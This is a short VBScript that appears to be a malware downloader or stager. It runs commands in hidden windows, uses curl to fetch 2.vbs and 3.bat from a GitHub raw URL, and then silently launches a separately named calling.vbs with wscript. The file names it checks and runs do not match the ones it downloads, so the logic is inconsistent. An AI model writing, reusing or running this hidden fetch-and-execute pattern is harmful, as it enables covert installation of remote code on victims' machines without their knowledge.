Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Function to run commands completely hidden
Function RunHidden(cmd)
    WshShell.Run "cmd /c " & cmd, 0, True
End Function

' Download files from GitHub
RunHidden "curl -L https://raw.githubusercontent.com/maadhavowlak/Site/main/2.vbs -o 2.vbs"
RunHidden "curl -L https://raw.githubusercontent.com/maadhavowlak/Site/main/3.bat -o 3.bat"

' Verify downloads before execution
If objFSO.FileExists("calling.vbs") And objFSO.FileExists("Lamda.bat") Then
    ' Execute calling.vbs in hidden mode
    WshShell.Run "wscript.exe calling.vbs", 0, False
Else
    ' Optional: Log error if files not downloaded
    RunHidden "echo Error: Required files missing > download_error.log"
End If
